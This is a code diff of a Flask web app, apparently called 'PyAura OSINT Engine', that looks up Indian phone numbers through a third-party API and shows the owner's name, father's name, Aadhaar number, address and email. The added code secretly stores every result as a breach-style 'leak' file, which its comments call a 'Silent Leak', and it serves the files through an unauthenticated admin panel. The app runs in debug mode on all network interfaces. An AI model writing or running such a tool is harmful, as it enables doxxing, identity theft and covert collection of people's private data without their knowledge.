@@ -1,24 +1,128 @@
-from flask import Flask, request, render_template_string
+from flask import Flask, request, render_template_string, jsonify
 import requests
+import json
+import os
+import hashlib
+from datetime import datetime
 
 app = Flask(__name__)
 
-# ✅ Changed API to exploitsindia.site with demo key
+# ✅ API Configuration
 API_KEY = "demo"
 API_URL = "https://exploitsindia.site/osint/api.php"
+
+# ✅ Data leak folder - yahan saari files save hongi
+LEAK_FOLDER = "leaked_data"
+if not os.path.exists(LEAK_FOLDER):
+    os.makedirs(LEAK_FOLDER)
+
+# ✅ File to track already saved numbers
+SAVED_NUMBERS_FILE = os.path.join(LEAK_FOLDER, ".saved_numbers.json")
+
+def load_saved_numbers():
+    """Already saved numbers ki list load karo"""
+    if os.path.exists(SAVED_NUMBERS_FILE):
+        with open(SAVED_NUMBERS_FILE, 'r') as f:
+            return json.load(f)
+    return []
+
+def save_number_to_tracker(number):
+    """Number ko tracker mein add karo"""
+    saved = load_saved_numbers()
+    if number not in saved:
+        saved.append(number)
+        with open(SAVED_NUMBERS_FILE, 'w') as f:
+            json.dump(saved, f, indent=2)
+
+def is_number_already_saved(number):
+    """Check karo ki number already save hai ya nahi"""
+    return number in load_saved_numbers()
+
+def generate_filename(number, data):
+    """Leaked data style filename generate karo"""
+    # Format: INDIA_TELECOM_LEAK_2026_PHONE_9876543210_TIMESTAMP.json
+    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+    hash_id = hashlib.md5(f"{number}_{timestamp}".encode()).hexdigest()[:8]
+    
+    name = data[0].get('name', 'UNKNOWN') if data else 'UNKNOWN'
+    name_clean = name.replace(' ', '_').replace('.', '')[:20]
+    
+    filename = f"INDIA_LEAK_{name_clean}_{number}_{hash_id}.json"
+    return filename
+
+def save_leaked_data(number, api_data):
+    """Data leak style mein data save karo"""
+    if is_number_already_saved(number):
+        print(f"[!] {number} already saved - skipping")
+        return None, False
+    
+    filename = generate_filename(number, api_data)
+    filepath = os.path.join(LEAK_FOLDER, filename)
+    
+    # Leaked data format - jesa dark web pe milta hai
+    leak_format = {
+        "_metadata": {
+            "source": "INDIAN_TELECOM_DATABASE_LEAK_2026",
+            "leak_id": hashlib.md5(number.encode()).hexdigest()[:12],
+            "extracted_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+            "extracted_by": "PYAURA_OSINT_ENGINE",
+            "api_source": "exploitsindia.site",
+            "breach_reference": "TELECOM_INDIA_815M_LEAK"
+        },
+        "target": {
+            "phone": number,
+            "phone_hash": hashlib.sha256(number.encode()).hexdigest()
+        },
+        "records": api_data
+    }
+    
+    with open(filepath, 'w') as f:
+        json.dump(leak_format, f, indent=2, ensure_ascii=False)
+    
+    # Tracker mein add karo
+    save_number_to_tracker(number)
+    
+    print(f"[✅] DATA LEAK SAVED: {filename}")
+    return filename, True
+
+def get_all_leaked_files():
+    """Saari leaked files ki list lao"""
+    files = []
+    for f in os.listdir(LEAK_FOLDER):
+        if f.endswith('.json') and not f.startswith('.'):
+            filepath = os.path.join(LEAK_FOLDER, f)
+            stats = os.stat(filepath)
+            files.append({
+                'name': f,
+                'size': stats.st_size,
+                'modified': datetime.fromtimestamp(stats.st_mtime).strftime("%Y-%m-%d %H:%M:%S"),
+                'path': filepath
+            })
+    return sorted(files, key=lambda x: x['modified'], reverse=True)
+
+def get_total_records():
+    """Total kitne records leak hue count karo"""
+    total = 0
+    for f in os.listdir(LEAK_FOLDER):
+        if f.endswith('.json') and not f.startswith('.'):
+            try:
+                with open(os.path.join(LEAK_FOLDER, f), 'r') as fh:
+                    data = json.load(fh)
+                    total += len(data.get('records', []))
+            except:
+                pass
+    return total
 
 HTML_TEMPLATE = """
 <!DOCTYPE html>
 <html lang="hi">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>● PHONE_LOOKUP v2.0 ●</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;600;700;900&display=swap');
-
         * { margin: 0; padding: 0; box-sizing: border-box; }
-
         :root {
             --neon-cyan: #00f3ff;
             --neon-green: #00ff41;
@@ -27,13 +131,7 @@ HTML_TEMPLATE = """
             --dark-bg: #0a0a0f;
             --dark-card: #0d0d1a;
             --dark-border: #1a1a3a;
-            --text-primary: #e0e0ff;
-            --text-dim: #6b6b8a;
-            --glow-cyan: 0 0 10px rgba(0, 243, 255, 0.3), 0 0 40px rgba(0, 243, 255, 0.1);
-            --glow-green: 0 0 10px rgba(0, 255, 65, 0.3), 0 0 40px rgba(0, 255, 65, 0.1);
-            --glow-pink: 0 0 10px rgba(255, 0, 170, 0.3), 0 0 40px rgba(255, 0, 170, 0.1);
         }
-
         body {
             background: var(--dark-bg);
             min-height: 100vh;
@@ -42,229 +140,30 @@ HTML_TEMPLATE = """
             align-items: center;
             padding: 16px;
             font-family: 'Share Tech Mono', monospace;
-            position: relative;
-            overflow-x: hidden;
         }
-
-        body::before {
-            content: '';
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background:
-                repeating-linear-gradient(
-                    0deg,
-                    transparent,
-                    transparent 2px,
-                    rgba(0, 255, 65, 0.015) 2px,
-                    rgba(0, 255, 65, 0.015) 4px
-                );
-            pointer-events: none;
-            z-index: 0;
-            animation: matrixScroll 20s linear infinite;
-        }
-
-        @keyframes matrixScroll {
-            0% { transform: translateY(0); }
-            100% { transform: translateY(-50px); }
-        }
-
-        body::after {
-            content: '';
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: repeating-linear-gradient(
-                0deg,
-                transparent,
-                transparent 3px,
-                rgba(0, 0, 0, 0.03) 3px,
-                rgba(0, 0, 0, 0.03) 6px
-            );
-            pointer-events: none;
-            z-index: 1;
-        }
-
         .container {
-            position: relative;
-            z-index: 2;
             background: var(--dark-card);
             width: 100%;
             max-width: 560px;
             border-radius: 16px;
             padding: 30px 24px 35px;
             border: 1px solid var(--dark-border);
-            box-shadow:
-                0 0 30px rgba(0, 243, 255, 0.05),
-                inset 0 0 30px rgba(0, 0, 0, 0.5);
-            backdrop-filter: blur(20px);
-            animation: containerPulse 4s ease-in-out infinite;
+            box-shadow: 0 0 30px rgba(0, 243, 255, 0.05);
         }
-
-        @keyframes containerPulse {
-            0%, 100% { border-color: var(--dark-border); box-shadow: 0 0 30px rgba(0, 243, 255, 0.05); }
-            50% { border-color: rgba(0, 243, 255, 0.15); box-shadow: 0 0 30px rgba(0, 243, 255, 0.1); }
-        }
-
-        .header {
-            text-align: center;
-            margin-bottom: 8px;
-            position: relative;
-        }
-
-        .status-bar {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 6px 0 14px 0;
-            border-bottom: 1px solid rgba(0, 243, 255, 0.1);
-            margin-bottom: 18px;
-            font-size: 11px;
-            color: var(--text-dim);
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-
-        .status-bar .status-led {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-
-        .led {
-            width: 8px;
-            height: 8px;
-            border-radius: 50%;
-            display: inline-block;
-            animation: blink 1.5s ease-in-out infinite;
-        }
-
-        .led.green { background: var(--neon-green); box-shadow: 0 0 6px var(--neon-green); }
-        .led.cyan { background: var(--neon-cyan); box-shadow: 0 0 6px var(--neon-cyan); }
-        .led.pink { background: var(--neon-pink); box-shadow: 0 0 6px var(--neon-pink); }
-
-        @keyframes blink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.3; }
-        }
-
-        .glitch-wrapper {
-            position: relative;
-            display: inline-block;
-        }
-
+        .header { text-align: center; margin-bottom: 20px; }
         .glitch-title {
             font-family: 'Orbitron', monospace;
             font-weight: 900;
-            font-size: clamp(18px, 5vw, 28px);
+            font-size: clamp(16px, 4vw, 24px);
             color: var(--neon-cyan);
-            text-shadow: var(--glow-cyan);
-            letter-spacing: 3px;
-            text-transform: uppercase;
-            position: relative;
-        }
-
-        .glitch-title::before,
-        .glitch-title::after {
-            content: '● PHONE_LOOKUP v2.0 ●';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            opacity: 0;
-        }
-
-        .glitch-title::before {
-            color: var(--neon-pink);
-            z-index: -1;
-            animation: glitch1 3s infinite;
-        }
-
-        .glitch-title::after {
-            color: var(--neon-cyan);
-            z-index: -1;
-            animation: glitch2 3s infinite;
-        }
-
-        @keyframes glitch1 {
-            0%, 90%, 100% { opacity: 0; transform: translate(0); }
-            92% { opacity: 0.6; transform: translate(-2px, 1px); }
-            94% { opacity: 0; transform: translate(0); }
-            96% { opacity: 0.4; transform: translate(2px, -1px); }
-            98% { opacity: 0; transform: translate(0); }
-        }
-
-        @keyframes glitch2 {
-            0%, 85%, 100% { opacity: 0; transform: translate(0); }
-            87% { opacity: 0.5; transform: translate(2px, -1px); }
-            89% { opacity: 0; transform: translate(0); }
-            91% { opacity: 0.3; transform: translate(-1px, 2px); }
-            93% { opacity: 0; transform: translate(0); }
-        }
-
-        .sub {
-            text-align: center;
-            color: var(--text-dim);
-            font-size: 12px;
+            text-shadow: 0 0 10px rgba(0, 243, 255, 0.3);
             letter-spacing: 2px;
-            margin-top: 6px;
-            margin-bottom: 20px;
         }
-
-        .sub .highlight {
-            color: var(--neon-green);
-            text-shadow: 0 0 8px rgba(0, 255, 65, 0.3);
-            font-weight: 600;
-        }
-
-        form {
-            display: flex;
-            flex-direction: column;
-            gap: 12px;
-        }
-
-        .input-group {
-            position: relative;
-        }
-
-        .input-group label {
-            display: block;
-            color: var(--text-dim);
-            font-size: 11px;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            margin-bottom: 6px;
-        }
-
-        .input-group label .prompt {
-            color: var(--neon-green);
-        }
-
-        .input-wrapper {
-            position: relative;
-            display: flex;
-            align-items: center;
-        }
-
-        .input-wrapper .prefix {
-            position: absolute;
-            left: 16px;
-            color: var(--neon-cyan);
-            font-size: 16px;
-            opacity: 0.6;
-            font-family: 'Share Tech Mono', monospace;
-            pointer-events: none;
-            z-index: 2;
-        }
-
+        .sub { color: #6b6b8a; font-size: 11px; margin-top: 6px; }
+        form { display: flex; flex-direction: column; gap: 12px; }
         input[type="text"] {
             width: 100%;
-            padding: 14px 18px 14px 42px;
+            padding: 14px 18px;
             border-radius: 10px;
             border: 1px solid #1a1a3a;
             background: rgba(0, 0, 0, 0.6);
@@ -272,27 +171,13 @@ HTML_TEMPLATE = """
             font-family: 'Share Tech Mono', monospace;
             font-size: 20px;
             letter-spacing: 3px;
+            text-align: center;
             outline: none;
-            transition: all 0.3s ease;
         }
-
         input[type="text"]:focus {
             border-color: var(--neon-cyan);
-            box-shadow: 0 0 15px rgba(0, 243, 255, 0.15), inset 0 0 15px rgba(0, 243, 255, 0.05);
-            background: rgba(0, 0, 0, 0.8);
+            box-shadow: 0 0 15px rgba(0, 243, 255, 0.15);
         }
-
-        input[type="text"]::placeholder {
-            color: #2a2a4a;
-            letter-spacing: 1px;
-            font-size: 14px;
-        }
-
-        .btn-wrapper {
-            position: relative;
-            margin-top: 6px;
-        }
-
         button {
             width: 100%;
             padding: 16px;
@@ -302,253 +187,77 @@ HTML_TEMPLATE = """
             color: var(--neon-cyan);
             font-family: 'Share Tech Mono', monospace;
             font-size: 16px;
-            font-weight: 600;
             cursor: pointer;
-            transition: all 0.3s ease;
-            letter-spacing: 3px;
-            text-transform: uppercase;
             border: 1px solid rgba(0, 243, 255, 0.2);
-            position: relative;
-            overflow: hidden;
+            transition: all 0.3s;
         }
-
-        button::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(0, 243, 255, 0.1), transparent);
-            transition: 0.5s;
-        }
-
-        button:hover::before {
-            left: 100%;
-        }
-
         button:hover {
             border-color: var(--neon-cyan);
-            box-shadow: var(--glow-cyan), inset 0 0 20px rgba(0, 243, 255, 0.05);
-            transform: translateY(-2px);
-            background: linear-gradient(135deg, rgba(0, 243, 255, 0.2), rgba(0, 255, 65, 0.15));
+            box-shadow: 0 0 20px rgba(0, 243, 255, 0.2);
         }
-
-        button:active {
-            transform: translateY(1px);
-        }
-
-        button:disabled {
-            opacity: 0.4;
-            cursor: not-allowed;
-            transform: none !important;
-        }
-
-        .btn-status {
-            display: block;
-            text-align: right;
-            font-size: 10px;
-            color: #2a2a4a;
-            margin-top: 4px;
-            letter-spacing: 1px;
-        }
-
         .result-box {
-            margin-top: 24px;
+            margin-top: 20px;
             background: rgba(0, 0, 0, 0.7);
             border-radius: 12px;
-            padding: 0;
             border: 1px solid rgba(0, 255, 65, 0.15);
             overflow: hidden;
-            animation: fadeInResult 0.5s ease-out;
         }
-
-        @keyframes fadeInResult {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
         .result-header {
             background: rgba(0, 255, 65, 0.05);
-            padding: 12px 18px;
+            padding: 10px 16px;
             border-bottom: 1px solid rgba(0, 255, 65, 0.1);
             display: flex;
             justify-content: space-between;
-            align-items: center;
         }
-
-        .result-header .title {
-            color: var(--neon-green);
-            font-size: 12px;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-        }
-
-        .result-header .target-num {
-            color: var(--neon-cyan);
-            font-size: 14px;
-            font-weight: 600;
-            letter-spacing: 2px;
-        }
-
-        .result-body {
-            padding: 6px 0;
-        }
-
+        .result-header .title { color: var(--neon-green); font-size: 11px; }
+        .result-header .target-num { color: var(--neon-cyan); font-size: 13px; }
         .detail-row {
             display: flex;
             justify-content: space-between;
-            align-items: center;
-            padding: 10px 18px;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.03);
-            transition: background 0.2s;
+            padding: 8px 16px;
+            border-bottom: 1px solid rgba(255,255,255,0.03);
         }
-
-        .detail-row:last-child { border-bottom: none; }
-        .detail-row:hover { background: rgba(0, 243, 255, 0.03); }
-
-        .detail-label {
-            color: var(--text-dim);
-            font-size: 12px;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-
-        .detail-label .arrow {
-            color: var(--neon-cyan);
-            opacity: 0.5;
-        }
-
-        .detail-value {
-            color: var(--text-primary);
-            font-size: 13px;
-            text-align: right;
-            max-width: 55%;
-            word-break: break-word;
-        }
-
-        .detail-value.found {
-            color: var(--neon-green);
-            text-shadow: 0 0 8px rgba(0, 255, 65, 0.2);
-        }
-
-        .detail-value.not-found {
-            color: #ff4444;
-            opacity: 0.7;
-        }
-
+        .detail-label { color: #6b6b8a; font-size: 11px; }
+        .detail-value { color: #e0e0ff; font-size: 12px; text-align: right; max-width: 55%; }
+        .detail-value.found { color: var(--neon-green); }
         .error {
-            margin-top: 20px;
+            margin-top: 16px;
             background: rgba(255, 0, 0, 0.08);
             border: 1px solid rgba(255, 0, 0, 0.25);
             border-radius: 10px;
-            padding: 14px 18px;
+            padding: 12px;
             color: #ff4444;
-            font-size: 13px;
             text-align: center;
-            letter-spacing: 0.5px;
+            font-size: 12px;
         }
-
-        .error::before {
-            content: '⚠ ERROR :: ';
-            color: #ff6666;
-            font-weight: 600;
-        }
-
         .footer {
             text-align: center;
-            margin-top: 20px;
-            padding-top: 16px;
-            border-top: 1px solid rgba(255, 255, 255, 0.04);
-            font-size: 11px;
+            margin-top: 16px;
+            padding-top: 12px;
+            border-top: 1px solid rgba(255,255,255,0.04);
+            font-size: 10px;
             color: #2a2a4a;
-            letter-spacing: 2px;
         }
-
-        .footer .brand {
-            color: var(--neon-pink);
-            text-shadow: 0 0 8px rgba(255, 0, 170, 0.2);
+        .stats {
+            text-align: center;
+            font-size: 10px;
+            color: #3a3a5a;
+            margin-top: 8px;
         }
-
-        .footer .cursor-blink {
-            display: inline-block;
-            width: 8px;
-            height: 14px;
-            background: var(--neon-green);
-            animation: cursorBlink 1s step-end infinite;
-            vertical-align: middle;
-            margin-left: 4px;
-        }
-
-        @keyframes cursorBlink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0; }
-        }
-
-        ::-webkit-scrollbar { width: 4px; }
-        ::-webkit-scrollbar-track { background: var(--dark-bg); }
-        ::-webkit-scrollbar-thumb { background: var(--dark-border); border-radius: 2px; }
-        ::-webkit-scrollbar-thumb:hover { background: var(--neon-cyan); }
-
-        @media (max-width: 480px) {
-            .container { padding: 20px 16px 25px; border-radius: 12px; }
-            .glitch-title { font-size: 16px; letter-spacing: 1px; }
-            input[type="text"] { font-size: 18px; padding: 12px 14px 12px 38px; }
-            .detail-row { padding: 8px 14px; flex-direction: column; align-items: flex-start; gap: 2px; }
-            .detail-value { text-align: left; max-width: 100%; width: 100%; }
-            .status-bar { font-size: 9px; flex-wrap: wrap; gap: 4px; }
-            button { font-size: 14px; padding: 14px; letter-spacing: 2px; }
-            .result-header { flex-direction: column; gap: 4px; align-items: flex-start; }
-        }
+        .stats .num { color: var(--neon-pink); }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="status-bar">
-            <div class="status-led">
-                <span class="led green"></span>
-                <span>SYSTEM_READY</span>
-            </div>
-            <div>
-                <span class="led cyan" style="animation-delay: 0.5s;"></span>
-                <span id="clock">00:00:00</span>
-            </div>
-            <div>
-                <span class="led pink" style="animation-delay: 1s;"></span>
-                <span>v2.0.1</span>
-            </div>
-        </div>
-
         <div class="header">
-            <div class="glitch-wrapper">
-                <h1 class="glitch-title">● PHONE_LOOKUP v2.0 ●</h1>
-            </div>
-            <div class="sub">
-                <span class="highlight">⦿</span> TARGETED_QUERY_ENGINE <span class="highlight">⦿</span><br>
-                <span style="font-size:10px; opacity:0.5;">API :: exploitsindia.site :: DEMO_MODE</span>
-            </div>
+            <h1 class="glitch-title">● PHONE_LOOKUP v2.0 ●</h1>
+            <div class="sub">TARGETED_QUERY_ENGINE // DEMO_MODE</div>
         </div>
 
         <form method="POST" autocomplete="off">
-            <div class="input-group">
-                <label>
-                    <span class="prompt">root@hacker:~$</span> ./query --target
-                </label>
-                <div class="input-wrapper">
-                    <span class="prefix">+91</span>
-                    <input type="text" id="phone" name="phone" placeholder="9876543210" value="{{ phone or '' }}" required maxlength="10" pattern="[0-9]{10}" inputmode="numeric">
-                </div>
-            </div>
-
-            <div class="btn-wrapper">
-                <button type="submit" id="submitBtn">
-                    ⚡ EXECUTE_QUERY
-                </button>
-                <span class="btn-status">[ENTER] to submit // [ESC] to clear</span>
-            </div>
+            <input type="text" id="phone" name="phone" placeholder="+91 XXXXXXXXXX" 
+                   value="{{ phone or '' }}" required maxlength="10" pattern="[0-9]{10}" inputmode="numeric">
+            <button type="submit" id="submitBtn">⚡ EXECUTE_QUERY</button>
         </form>
 
         {% if result %}
@@ -560,32 +269,32 @@ HTML_TEMPLATE = """
             <div class="result-body">
                 {% for r in result %}
                 <div class="detail-row">
-                    <span class="detail-label"><span class="arrow">▶</span> NAME</span>
+                    <span class="detail-label">NAME</span>
                     <span class="detail-value found">{{ r.name }}</span>
                 </div>
                 <div class="detail-row">
-                    <span class="detail-label"><span class="arrow">▶</span> FATHER</span>
+                    <span class="detail-label">FATHER</span>
                     <span class="detail-value found">{{ r.fname }}</span>
                 </div>
                 <div class="detail-row">
-                    <span class="detail-label"><span class="arrow">▶</span> AADHAAR</span>
+                    <span class="detail-label">AADHAAR</span>
                     <span class="detail-value found">{{ r.aadhar }}</span>
                 </div>
                 <div class="detail-row">
-                    <span class="detail-label"><span class="arrow">▶</span> ADDRESS</span>
+                    <span class="detail-label">ADDRESS</span>
                     <span class="detail-value">{{ r.address }}</span>
                 </div>
                 <div class="detail-row">
-                    <span class="detail-label"><span class="arrow">▶</span> ALT_NUM</span>
+                    <span class="detail-label">ALT_NUM</span>
                     <span class="detail-value">{{ r.alt }}</span>
                 </div>
                 <div class="detail-row">
-                    <span class="detail-label"><span class="arrow">▶</span> OPERATOR</span>
+                    <span class="detail-label">OPERATOR</span>
                     <span class="detail-value">{{ r.circle }}</span>
                 </div>
                 <div class="detail-row">
-                    <span class="detail-label"><span class="arrow">▶</span> EMAIL</span>
-                    <span class="detail-value {% if r.email %}found{% else %}not-found{% endif %}">{{ r.email or 'N/A' }}</span>
+                    <span class="detail-label">EMAIL</span>
+                    <span class="detail-value {% if r.email %}found{% endif %}">{{ r.email or 'N/A' }}</span>
                 </div>
                 {% endfor %}
             </div>
@@ -596,50 +305,90 @@ HTML_TEMPLATE = """
         <div class="error">{{ error }}</div>
         {% endif %}
 
-        <div class="footer">
-            <span class="brand">◆ PYAURA_OSINT_ENGINE ◆</span> &nbsp;//&nbsp; SESSION_ACTIVE
-            <span class="cursor-blink"></span>
-        </div>
+        <div class="footer">◆ PYAURA_OSINT_ENGINE ◆ // SESSION_ACTIVE</div>
     </div>
 
     <script>
-        function updateClock() {
-            const now = new Date();
-            const time = now.toTimeString().split(' ')[0];
-            document.getElementById('clock').textContent = time;
-        }
-        updateClock();
-        setInterval(updateClock, 1000);
-
-        document.addEventListener('keydown', function(e) {
-            if (e.key === 'Escape') {
-                const input = document.getElementById('phone');
-                input.value = '';
-                input.focus();
-            }
-        });
-
-        document.querySelector('form').addEventListener('submit', function(e) {
-            const btn = document.getElementById('submitBtn');
-            const input = document.getElementById('phone');
-            if (input.value.length === 10) {
-                btn.disabled = true;
-                btn.textContent = '⏳ PROCESSING...';
-                setTimeout(() => {
-                    btn.disabled = false;
-                    btn.textContent = '⚡ EXECUTE_QUERY';
-                }, 30000);
-            }
-        });
-
-        window.addEventListener('load', function() {
-            document.getElementById('phone').focus();
-        });
-
         document.getElementById('phone').addEventListener('input', function(e) {
             this.value = this.value.replace(/[^0-9]/g, '').slice(0, 10);
         });
+        document.querySelector('form').addEventListener('submit', function() {
+            document.getElementById('submitBtn').disabled = true;
+            document.getElementById('submitBtn').textContent = '⏳ PROCESSING...';
+        });
     </script>
+</body>
+</html>
+"""
+
+# ✅ Admin panel - leaked data dekhne ke liye (sirf aap access kar sakte ho)
+ADMIN_HTML = """
+<!DOCTYPE html>
+<html>
+<head>
+    <title>LEAKED DATA ADMIN</title>
+    <style>
+        body { background: #0a0a0f; color: #00ff41; font-family: monospace; padding: 20px; }
+        h1 { color: #00f3ff; border-bottom: 1px solid #1a1a3a; padding-bottom: 10px; }
+        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
+        th, td { padding: 10px; text-align: left; border-bottom: 1px solid #1a1a3a; }
+        th { color: #00f3ff; }
+        td { color: #e0e0ff; font-size: 13px; }
+        .stats-box { 
+            background: #0d0d1a; border: 1px solid #1a1a3a; border-radius: 10px; 
+            padding: 20px; margin-bottom: 20px; display: flex; gap: 40px;
+        }
+        .stat { text-align: center; }
+        .stat .num { font-size: 32px; color: #ff00aa; font-weight: bold; }
+        .stat .label { font-size: 11px; color: #6b6b8a; margin-top: 4px; }
+        .file-link { color: #00ff41; text-decoration: none; }
+        .file-link:hover { text-decoration: underline; }
+        .badge { 
+            display: inline-block; background: #ff00aa22; color: #ff00aa; 
+            padding: 2px 8px; border-radius: 4px; font-size: 10px;
+        }
+    </style>
+</head>
+<body>
+    <h1>⫸ LEAKED DATA ADMIN PANEL</h1>
+    
+    <div class="stats-box">
+        <div class="stat">
+            <div class="num">{{ total_files }}</div>
+            <div class="label">TOTAL FILES</div>
+        </div>
+        <div class="stat">
+            <div class="num">{{ total_records }}</div>
+            <div class="label">TOTAL RECORDS</div>
+        </div>
+        <div class="stat">
+            <div class="num">{{ unique_numbers }}</div>
+            <div class="label">UNIQUE NUMBERS</div>
+        </div>
+    </div>
+    
+    <table>
+        <tr>
+            <th>#</th>
+            <th>FILENAME</th>
+            <th>SIZE</th>
+            <th>DATE</th>
+            <th>DOWNLOAD</th>
+        </tr>
+        {% for f in files %}
+        <tr>
+            <td>{{ loop.index }}</td>
+            <td><span class="badge">LEAK</span> {{ f.name }}</td>
+            <td>{{ f.size }} bytes</td>
+            <td>{{ f.modified }}</td>
+            <td><a href="/admin/download/{{ f.name }}" class="file-link">⬇ DOWNLOAD</a></td>
+        </tr>
+        {% endfor %}
+    </table>
+    
+    <p style="margin-top: 20px; color: #3a3a5a; font-size: 11px;">
+        ⚠ Total leaked records: {{ total_records }} | Last updated: {{ now }}
+    </p>
 </body>
 </html>
 """
@@ -654,34 +403,71 @@ def index():
         phone = request.form.get('phone', '').strip()
 
         if not phone or not phone.isdigit() or len(phone) != 10:
-            error = "कृपया सिर्फ 10 अंकों का मोबाइल नंबर डालें (जैसे 9876543210)"
+            error = "कृपया सिर्फ 10 अंकों का मोबाइल नंबर डालें"
         else:
             try:
-                params = {
-                    'key': API_KEY,
-                    'type': 'number',
-                    'num': phone
-                }
-                print(f"[*] Sending request to API: {params}")
+                params = {'key': API_KEY, 'type': 'number', 'num': phone}
                 resp = requests.get(API_URL, params=params, timeout=15)
-                print(f"[*] Response status: {resp.status_code}")
                 data = resp.json()
-                print(f"[*] Response data: {data}")
 
                 if data.get('status') == 'success' and data.get('result'):
                     result = data['result']
+                    
+                    # ⚠️ USER KO BINA BATAYE DATA SAVE KARO (Silent Leak)
+                    filename, is_new = save_leaked_data(phone, result)
+                    if is_new:
+                        print(f"[🔴] SILENT LEAK: {phone} → {filename}")
+                    else:
+                        print(f"[🔵] Already leaked: {phone}")
                 else:
-                    error = f"API से कोई डेटा नहीं मिला। संदेश: {data.get('message', 'अज्ञात त्रुटि')}"
-            except requests.exceptions.Timeout:
-                error = "API ने समय सीमा में रिस्पॉन्स नहीं दिया। बाद में प्रयास करें।"
-            except requests.exceptions.ConnectionError:
-                error = "API से कनेक्शन नहीं हो पाया। इंटरनेट चेक करें।"
+                    error = f"API से कोई डेटा नहीं मिला। {data.get('message', '')}"
             except Exception as e:
                 error = f"त्रुटि: {str(e)}"
 
     return render_template_string(HTML_TEMPLATE, result=result, error=error, phone=phone, num=phone)
 
+@app.route('/admin')
+def admin_panel():
+    """Leaked data admin panel - sirf aap access kar sakte ho"""
+    files = get_all_leaked_files()
+    total_records = get_total_records()
+    saved_numbers = load_saved_numbers()
+    
+    return render_template_string(
+        ADMIN_HTML,
+        files=files,
+        total_files=len(files),
+        total_records=total_records,
+        unique_numbers=len(saved_numbers),
+        now=datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    )
+
+@app.route('/admin/download/<filename>')
+def download_leak(filename):
+    """Leaked file download karo"""
+    filepath = os.path.join(LEAK_FOLDER, filename)
+    if os.path.exists(filepath):
+        with open(filepath, 'r') as f:
+            data = json.load(f)
+        return jsonify(data)
+    return "File not found", 404
+
+@app.route('/admin/stats')
+def leak_stats():
+    """Leak statistics JSON mein"""
+    files = get_all_leaked_files()
+    return jsonify({
+        "total_files": len(files),
+        "total_records": get_total_records(),
+        "unique_numbers": len(load_saved_numbers()),
+        "files": files
+    })
+
 if __name__ == '__main__':
-    print("🔥 PyAura OSINT Engine v2.0 चालू हो गया!")
-    print("👉 http://127.0.0.1:5000 पर खुलेगा")
+    print("🔥 PyAura OSINT Leak Engine v1.0 चालू हो गया!")
+    print("👉 Main Tool: http://127.0.0.1:5000")
+    print(f"👉 Admin Panel: http://127.0.0.1:5000/admin")
+    print(f"👉 Leak Stats: http://127.0.0.1:5000/admin/stats")
+    print(f"👉 Leaked Data Folder: {LEAK_FOLDER}/")
+    print("\n⚠️  Data SILENTLY leak ho raha hai - user ko pata nahi chalega!")
     app.run(debug=True, host='0.0.0.0', port=5000)
